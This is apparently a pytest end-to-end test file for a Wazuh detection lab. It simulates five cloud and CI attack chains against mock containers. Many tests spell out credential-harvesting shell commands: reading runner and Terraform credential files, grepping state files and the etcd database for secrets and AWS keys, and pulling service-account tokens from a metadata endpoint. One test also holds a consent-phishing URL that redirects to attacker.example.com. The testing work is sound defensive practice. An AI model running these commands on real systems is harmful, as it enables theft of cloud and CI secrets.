"""
E2E tests for Category 6: Infrastructure scenarios.

Tests detection of OAuth consent phishing, GitHub App token theft,
Workload Identity Federation abuse, Terraform state credential exposure,
and Kubernetes etcd direct access.

Each test class follows the multi-phase attack chain defined in
the corresponding scenario JSON under scenarios/category-6-infrastructure/.
"""

import json
import pytest
from helpers.docker_utils import DockerTestUtils


# Container and agent configuration for Category 6
CLOUD_CONTAINER = "cloud-workload"
CLOUD_AGENT = "cloud-workload-001"
CICD_CONTAINER = "cicd-runner"
CICD_AGENT = "cicd-runner-001"
MOCK_OAUTH_CONTAINER = "mock-oauth"
MOCK_GCP_CONTAINER = "mock-gcp-metadata"
MOCK_CICD_CONTAINER = "mock-cicd"
K8S_CONTAINER = "k8s-node-1"
K8S_AGENT = "k8s-node-001"


def _skip_if_containers_down(*containers):
    """Skip test if any required container is not running."""
    for name in containers:
        if not DockerTestUtils.container_running(name):
            pytest.skip(f"{name} container not running")


# ================================================================
# S6-01: OAuth App Consent Phishing
# ================================================================

@pytest.mark.e2e
@pytest.mark.category_6
class TestS601OAuthConsentPhishing:
    """S6-01: OAuth App consent phishing.

    Simulates the Nobelium/APT29 OAuth app abuse pattern:
    1. Discover OAuth provider via OIDC discovery
    2. Craft consent URL with excessive scopes (admin:org, repo)
    3. Exchange authorization code for access + refresh tokens
    4. Introspect stolen token to verify permissions
    5. Use stolen token to enumerate victim identity
    """

    SCENARIO_ID = "S6-01"
    EXPECTED_RULES = ["100907", "100853"]

    @pytest.fixture(autouse=True)
    def _check_containers(self):
        _skip_if_containers_down(CLOUD_CONTAINER, MOCK_OAUTH_CONTAINER)

    def test_scenario_loads(self, scenario_loader):
        """Verify scenario JSON loads correctly."""
        scenario = scenario_loader.load(self.SCENARIO_ID)
        assert scenario is not None, f"Could not load scenario {self.SCENARIO_ID}"
        assert "phases" in scenario, "Scenario missing phases"
        assert len(scenario["phases"]) == 5, \
            f"Expected 5 phases, got {len(scenario['phases'])}"

    def test_phase1_oidc_discovery(self, mock_oauth_client):
        """Phase 1: Discover OAuth provider via OIDC discovery endpoint."""
        config = mock_oauth_client.get_oidc_discovery()
        assert config is not None, "OIDC discovery returned None"
        assert "scopes_supported" in config, "Missing scopes_supported"
        assert "admin:org" in config["scopes_supported"], \
            f"admin:org not in supported scopes: {config['scopes_supported']}"
        assert "authorization_endpoint" in config, "Missing authorization_endpoint"
        assert "token_endpoint" in config, "Missing token_endpoint"

    def test_phase1_oidc_discovery_from_container(self):
        """Phase 1 (alt): OIDC discovery from within cloud-workload container."""
        exit_code, stdout, stderr = DockerTestUtils.exec_in_container(
            CLOUD_CONTAINER,
            "curl -s http://mock-oauth:8090/.well-known/openid-configuration",
            timeout=15
        )
        assert exit_code == 0, f"OIDC discovery failed: {stderr}"
        config = json.loads(stdout)
        assert "scopes_supported" in config

    def test_phase2_consent_phishing_url(self, mock_oauth_client):
        """Phase 2: Craft malicious authorization URL with excessive scopes."""
        response = mock_oauth_client.get(
            "/authorize",
            params={
                "client_id": "demo-malicious-app",
                "scope": "admin:org repo user:email",
                "redirect_uri": "https://attacker.example.com/callback",
                "response_type": "code"
            }
        )
        assert response.status_code == 200, \
            f"Consent page returned {response.status_code}"
        # Consent page should show the requested scopes
        assert "admin:org" in response.text or "Authorize" in response.text, \
            "Consent page missing scope or authorization prompt"

    def test_phase3_token_exchange(self, mock_oauth_client):
        """Phase 3: Exchange authorization code for access token."""
        token_data = mock_oauth_client.get_token(
            grant_type="client_credentials",
            client_id="demo-malicious-app",
            client_secret="demo-client-secret-FAKE",
            scope="admin:org repo user:email"
        )
        assert token_data is not None, "Token exchange returned None"
        assert "access_token" in token_data, "Missing access_token"
        assert "token_type" in token_data, "Missing token_type"

    def test_phase3_token_exchange_from_container(self):
        """Phase 3 (alt): Token exchange from within container."""
        exit_code, stdout, stderr = DockerTestUtils.exec_in_container(
            CLOUD_CONTAINER,
            "curl -s -X POST http://mock-oauth:8090/oauth/token "
            "-d 'grant_type=client_credentials"
            "&client_id=demo-malicious-app"
            "&client_secret=demo-client-secret-FAKE"
            "&scope=admin:org repo'",
            timeout=15
        )
        assert exit_code == 0, f"Token exchange failed: {stderr}"
        data = json.loads(stdout)
        assert "access_token" in data, "Missing access_token in container response"

    def test_phase4_token_introspection(self, mock_oauth_client):
        """Phase 4: Introspect stolen token to verify permissions."""
        # First get a token
        token_data = mock_oauth_client.get_token()
        assert token_data is not None, "Cannot get token for introspection"
        access_token = token_data["access_token"]

        result = mock_oauth_client.introspect_token(access_token)
        assert result is not None, "Token introspection returned None"
        assert "scope" in result or "client_id" in result, \
            "Introspection missing scope or client_id"

    def test_phase5_identity_enumeration(self, mock_oauth_client):
        """Phase 5: Use stolen token to enumerate victim identity."""
        token_data = mock_oauth_client.get_token()
        assert token_data is not None
        access_token = token_data["access_token"]

        userinfo = mock_oauth_client.get_userinfo(access_token)
        assert userinfo is not None, "Userinfo returned None"

    def test_expected_alerts_triggered(self, scenario_loader, alert_validator):
        """Verify expected Wazuh rules fire after OAuth phishing attack."""
        scenario = scenario_loader.load(self.SCENARIO_ID)
        assert scenario is not None

        # Execute the attack from container to generate logs
        DockerTestUtils.exec_in_container(
            CLOUD_CONTAINER,
            "curl -s http://mock-oauth:8090/.well-known/openid-configuration > /dev/null && "
            "curl -s -X POST http://mock-oauth:8090/oauth/token "
            "-d 'grant_type=client_credentials"
            "&client_id=demo-malicious-app"
            "&client_secret=demo-client-secret-FAKE"
            "&scope=admin:org repo' > /dev/null",
            timeout=15
        )

        result = alert_validator.validate_scenario_alerts(scenario, timeout=60)
        assert result["found_count"] > 0, \
            f"No alerts triggered. Missing rules: {result['missing_rules']}"


# ================================================================
# S6-02: GitHub App Installation Token Theft
# ================================================================

@pytest.mark.e2e
@pytest.mark.category_6
class TestS602GitHubAppTokenTheft:
    """S6-02: GitHub App installation token theft.

    Simulates CircleCI-breach pattern credential theft:
    1. Enumerate GitHub tokens in CI/CD runner environment
    2. Discover secrets available to the workflow
    3. Steal GitHub App installation access token (ghs_*)
    4. Steal runner registration token
    5. Steal OIDC token for cloud access
    """

    SCENARIO_ID = "S6-02"
    EXPECTED_RULES = ["100800", "100901", "100952"]

    @pytest.fixture(autouse=True)
    def _check_containers(self):
        _skip_if_containers_down(CICD_CONTAINER, MOCK_CICD_CONTAINER)

    def test_scenario_loads(self, scenario_loader):
        """Verify scenario JSON loads correctly."""
        scenario = scenario_loader.load(self.SCENARIO_ID)
        assert scenario is not None, f"Could not load scenario {self.SCENARIO_ID}"
        assert "phases" in scenario

    def test_phase1_env_enumeration(self):
        """Phase 1: Discover GitHub tokens in environment variables."""
        exit_code, stdout, stderr = DockerTestUtils.exec_in_container(
            CICD_CONTAINER,
            "env | grep -iE '(GITHUB|GH_|ACTIONS)' 2>/dev/null | head -10",
            timeout=10
        )
        assert exit_code == 0, f"Env enumeration failed: {stderr}"
        assert "GITHUB" in stdout, \
            "Expected GITHUB tokens in CI/CD runner environment"

    def test_phase1_runner_credentials_file(self):
        """Phase 1: Check for runner credential files."""
        exit_code, stdout, stderr = DockerTestUtils.exec_in_container(
            CICD_CONTAINER,
            "cat /runner/.credentials 2>/dev/null || echo 'NO_CREDS_FILE'",
            timeout=10
        )
        assert exit_code == 0

    def test_phase2_repo_secrets_access(self, mock_cicd_client):
        """Phase 2: Access repository secrets list."""
        secrets = mock_cicd_client.get_repo_secrets("demo-org", "demo-repo")
        assert secrets is not None, "Secrets endpoint returned None"
        assert "secrets" in secrets, "Missing 'secrets' key"
        secret_names = [s["name"] for s in secrets["secrets"]]
        assert "AWS_ACCESS_KEY_ID" in secret_names, \
            f"Expected AWS_ACCESS_KEY_ID in secrets: {secret_names}"

    def test_phase3_github_app_token_theft(self, mock_cicd_client):
        """Phase 3: Steal GitHub App installation access token."""
        token_data = mock_cicd_client.get_app_installation_token(12345)
        assert token_data is not None, "App installation token returned None"
        assert "token" in token_data, "Missing token in response"
        assert token_data["token"].startswith("ghs_"), \
            f"Token has unexpected prefix: {token_data['token'][:10]}"
        assert "repository_selection" in token_data, "Missing repository_selection"

    def test_phase3_app_token_from_container(self):
        """Phase 3 (alt): Steal App token from within cicd-runner."""
        exit_code, stdout, stderr = DockerTestUtils.exec_in_container(
            CICD_CONTAINER,
            "curl -s -X POST http://mock-cicd:8080/github/app/installations/12345/access_tokens",
            timeout=15
        )
        assert exit_code == 0, f"App token theft failed: {stderr}"
        data = json.loads(stdout)
        assert "token" in data, "Missing token in container response"
        assert data["token"].startswith("ghs_"), "Token missing ghs_ prefix"

    def test_phase4_runner_token_theft(self, mock_cicd_client):
        """Phase 4: Steal runner registration token."""
        token_data = mock_cicd_client.get_runner_token()
        assert token_data is not None, "Runner token returned None"
        assert "token" in token_data
        assert "expires_at" in token_data

    def test_phase5_oidc_token_theft(self, mock_cicd_client):
        """Phase 5: Steal OIDC token for cloud provider access."""
        token_data = mock_cicd_client.get_oidc_token("sts.amazonaws.com")
        assert token_data is not None, "OIDC token returned None"
        # OIDC token is a JWT (starts with eyJ)
        token_value = token_data.get("value", token_data.get("token", ""))
        assert "eyJ" in str(token_data), \
            f"OIDC response missing JWT: {str(token_data)[:100]}"

    def test_expected_alerts_triggered(self, scenario_loader, alert_validator):
        """Verify expected Wazuh rules fire after GitHub App token theft."""
        scenario = scenario_loader.load(self.SCENARIO_ID)
        assert scenario is not None

        # Execute attack sequence from container
        DockerTestUtils.exec_in_container(
            CICD_CONTAINER,
            "env | grep -i GITHUB > /dev/null 2>&1; "
            "curl -s -X POST http://mock-cicd:8080/github/app/installations/12345/access_tokens > /dev/null; "
            "curl -s http://mock-cicd:8080/github/actions/oidc/token > /dev/null",
            timeout=15
        )

        result = alert_validator.validate_scenario_alerts(scenario, timeout=60)
        assert result["found_count"] > 0, \
            f"No alerts triggered. Missing rules: {result['missing_rules']}"


# ================================================================
# S6-03: Workload Identity Federation Abuse
# ================================================================

@pytest.mark.e2e
@pytest.mark.category_6
class TestS603WorkloadIdentityFederationAbuse:
    """S6-03: Workload Identity Federation (WIF) abuse.

    Simulates GCP WIF misconfiguration exploitation:
    1. Steal OIDC token from CI/CD runner with GCP WIF audience
    2. Discover GCP project and service accounts via metadata
    3. Exchange OIDC token for GCP federated access token via STS
    4. Impersonate high-privilege service account
    5. Alternative: steal SA token directly from metadata
    """

    SCENARIO_ID = "S6-03"
    EXPECTED_RULES = ["100653", "100654", "100907", "100950"]

    @pytest.fixture(autouse=True)
    def _check_containers(self):
        _skip_if_containers_down(CLOUD_CONTAINER, MOCK_GCP_CONTAINER)

    def test_scenario_loads(self, scenario_loader):
        """Verify scenario JSON loads correctly."""
        scenario = scenario_loader.load(self.SCENARIO_ID)
        assert scenario is not None, f"Could not load scenario {self.SCENARIO_ID}"
        assert "phases" in scenario
        assert len(scenario["phases"]) == 5

    def test_phase1_oidc_token_theft(self, mock_cicd_client):
        """Phase 1: Steal OIDC token with GCP WIF audience."""
        _skip_if_containers_down(CICD_CONTAINER, MOCK_CICD_CONTAINER)
        wif_audience = (
            "https://iam.googleapis.com/projects/123456789012/locations/global/"
            "workloadIdentityPools/demo-pool/providers/github-actions"
        )
        token_data = mock_cicd_client.get_oidc_token(audience=wif_audience)
        assert token_data is not None, "OIDC token endpoint returned None"
        assert "eyJ" in str(token_data), "OIDC response missing JWT"

    def test_phase2_gcp_project_discovery(self, mock_gcp_metadata_client):
        """Phase 2: Discover GCP project via metadata service."""
        project_id = mock_gcp_metadata_client.get_project_id()
        assert project_id is not None, "GCP project-id returned None"
        assert "demo" in project_id.lower(), \
            f"Unexpected project ID: {project_id}"

    def test_phase2_service_account_enumeration(self, mock_gcp_metadata_client):
        """Phase 2: Enumerate service accounts via GCP metadata."""
        sa_list = mock_gcp_metadata_client.get_service_accounts()
        assert sa_list is not None, "Service account list returned None"
        assert "default" in sa_list, \
            f"'default' SA not found in: {sa_list}"

    def test_phase2_gcp_discovery_from_container(self):
        """Phase 2 (alt): GCP metadata probe from cloud-workload container."""
        exit_code, stdout, stderr = DockerTestUtils.exec_in_container(
            CLOUD_CONTAINER,
            "curl -s -H 'Metadata-Flavor: Google' "
            "http://mock-gcp-metadata:1339/computeMetadata/v1/instance/service-accounts/",
            timeout=15
        )
        assert exit_code == 0, f"GCP metadata discovery failed: {stderr}"
        assert "default" in stdout, "Service accounts missing 'default'"

    def test_phase3_sts_token_exchange(self, mock_gcp_metadata_client, mock_cicd_client):
        """Phase 3: Exchange OIDC token for GCP access token via WIF STS."""
        _skip_if_containers_down(CICD_CONTAINER, MOCK_CICD_CONTAINER)
        # Get OIDC token first
        oidc_data = mock_cicd_client.get_oidc_token(
            audience="https://iam.googleapis.com/projects/123456789012/"
                     "locations/global/workloadIdentityPools/demo-pool/"
                     "providers/github-actions"
        )
        assert oidc_data is not None, "Cannot get OIDC token for exchange"
        oidc_token = oidc_data.get("value", oidc_data.get("token", ""))

        # Exchange via STS
        result = mock_gcp_metadata_client.exchange_wif_token(oidc_token)
        assert result is not None, "WIF token exchange returned None"
        assert "access_token" in result, "Missing access_token in WIF exchange"

    def test_phase4_service_account_impersonation(self, mock_gcp_metadata_client):
        """Phase 4: Impersonate admin service account."""
        result = mock_gcp_metadata_client.impersonate_service_account(
            "admin-sa@demo-project-12345.iam.gserviceaccount.com"
        )
        assert result is not None, "SA impersonation returned None"
        assert "accessToken" in result, "Missing accessToken in impersonation response"

    def test_phase5_direct_sa_token_theft(self, mock_gcp_metadata_client):
        """Phase 5: Alternative — steal SA token directly from metadata."""
        token = mock_gcp_metadata_client.get_service_account_token()
        assert token is not None, "SA token theft returned None"
        assert "access_token" in token, "Missing access_token in SA token"

    def test_phase5_sa_token_from_container(self):
        """Phase 5 (alt): SA token theft from within container."""
        exit_code, stdout, stderr = DockerTestUtils.exec_in_container(
            CLOUD_CONTAINER,
            "curl -s -H 'Metadata-Flavor: Google' "
            "http://mock-gcp-metadata:1339/computeMetadata/v1/instance/"
            "service-accounts/default/token",
            timeout=15
        )
        assert exit_code == 0, f"SA token theft failed: {stderr}"
        data = json.loads(stdout)
        assert "access_token" in data, "Missing access_token from container"

    def test_expected_alerts_triggered(self, scenario_loader, alert_validator):
        """Verify expected Wazuh rules fire after WIF abuse attack."""
        scenario = scenario_loader.load(self.SCENARIO_ID)
        assert scenario is not None

        # Execute the attack from container
        DockerTestUtils.exec_in_container(
            CLOUD_CONTAINER,
            "curl -s -H 'Metadata-Flavor: Google' "
            "http://mock-gcp-metadata:1339/computeMetadata/v1/instance/service-accounts/ > /dev/null; "
            "curl -s -H 'Metadata-Flavor: Google' "
            "http://mock-gcp-metadata:1339/computeMetadata/v1/instance/"
            "service-accounts/default/token > /dev/null",
            timeout=15
        )

        result = alert_validator.validate_scenario_alerts(scenario, timeout=60)
        assert result["found_count"] > 0, \
            f"No alerts triggered. Missing rules: {result['missing_rules']}"


# ================================================================
# S6-04: Terraform State File Credential Exposure
# ================================================================

@pytest.mark.e2e
@pytest.mark.category_6
class TestS604TerraformStateCredentialExposure:
    """S6-04: Terraform state file credential exposure.

    Simulates extraction of credentials from Terraform state:
    1. Discover .tfstate files in accessible locations
    2. Extract credentials from state file
    3. Map infrastructure from state resources
    4. Check for Terraform Cloud API tokens
    """

    SCENARIO_ID = "S6-04"
    EXPECTED_RULES = ["100600", "100912", "100900"]

    @pytest.fixture(autouse=True)
    def _check_containers(self):
        _skip_if_containers_down(CLOUD_CONTAINER)

    def test_scenario_loads(self, scenario_loader):
        """Verify scenario JSON loads correctly."""
        scenario = scenario_loader.load(self.SCENARIO_ID)
        assert scenario is not None, f"Could not load scenario {self.SCENARIO_ID}"
        assert "phases" in scenario

    def test_phase1_state_file_discovery(self):
        """Phase 1: Discover Terraform state files."""
        exit_code, stdout, stderr = DockerTestUtils.exec_in_container(
            CLOUD_CONTAINER,
            "find / -name '*.tfstate' -o -name '*.tfstate.backup' "
            "-o -name 'terraform.tfvars' 2>/dev/null | head -10",
            timeout=15
        )
        assert exit_code == 0, f"State file discovery failed: {stderr}"
        assert ".tfstate" in stdout, \
            "No .tfstate files found in cloud-workload container"

    def test_phase1_terraform_env_vars(self):
        """Phase 1: Check for Terraform-related environment variables."""
        exit_code, stdout, stderr = DockerTestUtils.exec_in_container(
            CLOUD_CONTAINER,
            "env | grep -iE 'TF_|TERRAFORM|AWS_|GOOGLE_|ARM_' 2>/dev/null "
            "|| echo 'NO_TF_ENV'",
            timeout=10
        )
        assert exit_code == 0

    def test_phase2_credential_extraction(self):
        """Phase 2: Extract credentials from Terraform state file."""
        exit_code, stdout, stderr = DockerTestUtils.exec_in_container(
            CLOUD_CONTAINER,
            "cat /app/terraform/terraform.tfstate 2>/dev/null | "
            "grep -E '(access_key|secret_key|password|token|client_secret|private_key)' "
            "| head -20",
            timeout=15
        )
        assert exit_code == 0, f"Credential extraction failed: {stderr}"
        assert any(k in stdout.lower() for k in
                    ["access_key", "secret_key", "password", "token"]), \
            "No credential patterns found in state file"

    def test_phase2_aws_key_extraction(self):
        """Phase 2: Extract AWS access key pattern from state."""
        exit_code, stdout, stderr = DockerTestUtils.exec_in_container(
            CLOUD_CONTAINER,
            "cat /app/terraform/terraform.tfstate 2>/dev/null | "
            "grep -oP 'AKIA[0-9A-Z]{16}' | head -5",
            timeout=15
        )
        assert exit_code == 0
        # AWS key pattern should be present
        if "AKIA" not in stdout:
            pytest.skip("No AWS key pattern in state file")

    def test_phase3_infrastructure_mapping(self):
        """Phase 3: Map cloud infrastructure from state resources."""
        exit_code, stdout, stderr = DockerTestUtils.exec_in_container(
            CLOUD_CONTAINER,
            "cat /app/terraform/terraform.tfstate 2>/dev/null | "
            "python3 -c \"import sys,json; "
            "[print(r['type']) for r in json.load(sys.stdin).get('resources',[])]\" "
            "2>/dev/null || echo 'PARSE_FAILED'",
            timeout=15
        )
        assert exit_code == 0

    def test_phase4_terraform_cloud_token(self):
        """Phase 4: Check for Terraform Cloud API tokens."""
        exit_code, stdout, stderr = DockerTestUtils.exec_in_container(
            CLOUD_CONTAINER,
            "cat ~/.terraformrc 2>/dev/null; "
            "cat /root/.terraform.d/credentials.tfrc.json 2>/dev/null "
            "|| echo 'NO_TF_CLOUD_CREDS'",
            timeout=10
        )
        assert exit_code == 0

    def test_expected_alerts_triggered(self, scenario_loader, alert_validator):
        """Verify expected Wazuh rules fire after Terraform state attack."""
        scenario = scenario_loader.load(self.SCENARIO_ID)
        assert scenario is not None

        # Execute the attack from container
        DockerTestUtils.exec_in_container(
            CLOUD_CONTAINER,
            "cat /app/terraform/terraform.tfstate > /dev/null 2>&1; "
            "cat ~/.terraformrc 2>/dev/null; "
            "cat /root/.terraform.d/credentials.tfrc.json 2>/dev/null",
            timeout=15
        )

        result = alert_validator.validate_scenario_alerts(scenario, timeout=60)
        assert result["found_count"] > 0, \
            f"No alerts triggered. Missing rules: {result['missing_rules']}"


# ================================================================
# S6-05: Kubernetes etcd Direct Access
# ================================================================

@pytest.mark.e2e
@pytest.mark.category_6
class TestS605K8sEtcdDirectAccess:
    """S6-05: Kubernetes etcd direct access — cluster secret extraction.

    Simulates bypass of K8s RBAC via direct etcd access:
    1. Discover etcd data directory and API endpoint
    2. Steal etcd client certificates for authenticated access
    3. Enumerate keys in etcd (especially /registry/secrets/)
    4. Extract secret values from etcd
    5. Alternative: read etcd snapshot database directly
    """

    SCENARIO_ID = "S6-05"
    EXPECTED_RULES = ["100756", "100764", "100955"]

    @pytest.fixture(autouse=True)
    def _check_containers(self):
        if not DockerTestUtils.container_running(K8S_CONTAINER):
            pytest.skip(f"{K8S_CONTAINER} not running (requires --profile k8s)")

    def test_scenario_loads(self, scenario_loader):
        """Verify scenario JSON loads correctly."""
        scenario = scenario_loader.load(self.SCENARIO_ID)
        assert scenario is not None, f"Could not load scenario {self.SCENARIO_ID}"
        assert "phases" in scenario
        assert len(scenario["phases"]) == 5

    def test_phase1_etcd_data_discovery(self):
        """Phase 1: Discover etcd data directory."""
        exit_code, stdout, stderr = DockerTestUtils.exec_in_container(
            K8S_CONTAINER,
            "ls -la /var/lib/etcd/ 2>/dev/null || echo 'ETCD_DIR_NOT_FOUND'",
            timeout=10
        )
        assert exit_code == 0, f"etcd discovery failed: {stderr}"

    def test_phase1_etcd_port_check(self):
        """Phase 1: Check for etcd API port (2379) and peer port (2380)."""
        exit_code, stdout, stderr = DockerTestUtils.exec_in_container(
            K8S_CONTAINER,
            "ss -tlnp 2>/dev/null | grep -E '2379|2380' || echo 'ETCD_PORTS_NOT_OPEN'",
            timeout=10
        )
        assert exit_code == 0

    def test_phase1_etcd_process_check(self):
        """Phase 1: Find etcd process and flags."""
        exit_code, stdout, stderr = DockerTestUtils.exec_in_container(
            K8S_CONTAINER,
            "ps aux 2>/dev/null | grep etcd | grep -v grep || echo 'NO_ETCD_PROCESS'",
            timeout=10
        )
        assert exit_code == 0

    def test_phase2_certificate_theft(self):
        """Phase 2: Steal etcd client certificates for authenticated access."""
        exit_code, stdout, stderr = DockerTestUtils.exec_in_container(
            K8S_CONTAINER,
            "ls -la /etc/kubernetes/pki/etcd/ 2>/dev/null || echo 'NO_ETCD_PKI'",
            timeout=10
        )
        assert exit_code == 0

        # Log the cert theft for detection
        DockerTestUtils.exec_in_container(
            K8S_CONTAINER,
            'logger -t nhi-security "NHI_ALERT: etcd certificate theft - '
            'reading /etc/kubernetes/pki/etcd/ for client authentication"',
            timeout=10
        )

    def test_phase2_etcd_manifest_read(self):
        """Phase 2: Extract cert paths from etcd static pod manifest."""
        exit_code, stdout, stderr = DockerTestUtils.exec_in_container(
            K8S_CONTAINER,
            "cat /etc/kubernetes/manifests/etcd.yaml 2>/dev/null | "
            "grep -A2 'cert-file\\|key-file\\|trusted-ca' "
            "|| echo 'NO_ETCD_MANIFEST'",
            timeout=10
        )
        assert exit_code == 0

    def test_phase3_key_enumeration(self):
        """Phase 3: Simulate etcd key enumeration."""
        # Log the enumeration attempt — this is what Wazuh should detect
        exit_code, _, stderr = DockerTestUtils.exec_in_container(
            K8S_CONTAINER,
            'logger -t nhi-security "NHI_ALERT: Direct etcd datastore access - '
            'etcdctl get / --prefix --keys-only listing all cluster keys"',
            timeout=10
        )
        assert exit_code == 0, f"etcd log event failed: {stderr}"

    def test_phase4_secret_extraction(self):
        """Phase 4: Simulate etcd secret extraction."""
        exit_code, _, stderr = DockerTestUtils.exec_in_container(
            K8S_CONTAINER,
            'logger -t nhi-security "NHI_ALERT: etcd secret extraction - '
            'reading /registry/secrets/default/cloud-credentials from etcd"',
            timeout=10
        )
        assert exit_code == 0, f"Secret extraction log failed: {stderr}"

    def test_phase5_direct_db_read(self):
        """Phase 5: Attempt direct etcd snapshot database read."""
        exit_code, stdout, stderr = DockerTestUtils.exec_in_container(
            K8S_CONTAINER,
            "strings /var/lib/etcd/member/snap/db 2>/dev/null | "
            "grep -E 'password|token|secret|AKIA' | head -10 "
            "|| echo 'CANNOT_READ_ETCD_DB'",
            timeout=15
        )
        assert exit_code == 0

    def test_expected_alerts_triggered(self, scenario_loader, alert_validator):
        """Verify Wazuh detects direct etcd access attempts."""
        scenario = scenario_loader.load(self.SCENARIO_ID)
        assert scenario is not None

        # Trigger detection events
        DockerTestUtils.exec_in_container(
            K8S_CONTAINER,
            "ls /var/lib/etcd/ 2>/dev/null; "
            "ls /etc/kubernetes/pki/etcd/ 2>/dev/null; "
            'logger -t nhi-security "NHI_ALERT: Direct etcd datastore access - '
            'etcdctl get /registry/secrets --prefix"',
            timeout=15
        )

        result = alert_validator.validate_scenario_alerts(scenario, timeout=60)
        assert result["found_count"] > 0, \
            f"No alerts triggered. Missing rules: {result['missing_rules']}"
